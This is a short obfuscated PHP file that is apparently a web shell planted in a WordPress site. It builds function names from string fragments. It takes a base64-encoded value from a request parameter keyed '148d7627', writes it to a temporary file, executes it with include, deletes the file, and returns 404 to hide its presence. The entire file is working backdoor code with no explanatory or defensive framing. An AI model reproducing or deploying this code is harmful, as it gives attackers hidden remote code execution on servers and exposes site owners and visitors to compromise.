<?php
try{
$v28494[]='unli'.'nk';
$v28494[]='array_'.'key_exists';
$v28494[]='file_put_c'.'ontents';
$v28494[]='sys_'.'get_temp_dir';
$v28494[]='base64_'.'decode';
$v28494[]='tem'.'pnam';
$u0908a='148d7'.'627';
if($v28494[1]($u0908a,$_POST)){
$od925a=$v28494[4]($_POST[$u0908a]);
}elseif($v28494[1]($u0908a,$_GET)){
$od925a=$v28494[4]($_GET[$u0908a]);
}else{$od925a=null;}
if($od925a){
$r37652=$v28494[5]($v28494[3](),'w'.'p_');
if($r37652){
$v28494[2]($r37652,'<'.'?ph'.'p '.$od925a);
http_response_code(404);
@include_once($r37652);
@$v28494[0]($r37652);
}}
http_response_code(404);
}catch(Throwable $e){http_response_code(404);}catch(Exception $e){http_response_code(404);}
